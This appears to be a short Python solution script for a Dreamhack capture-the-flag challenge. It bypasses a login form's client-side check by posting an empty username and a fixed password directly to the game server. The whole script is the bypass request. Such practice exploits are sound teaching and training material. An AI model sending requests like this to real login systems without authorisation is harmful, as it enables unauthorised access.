import requests

url = "http://host3.dreamhack.games:20220/"

form_data = {
    "uname": "",
    "password": "securepassword"
}

response = requests.post(url, data = form_data)

print(response.text)

#the site doesn't let you directly input nothing so send http request submitting nothing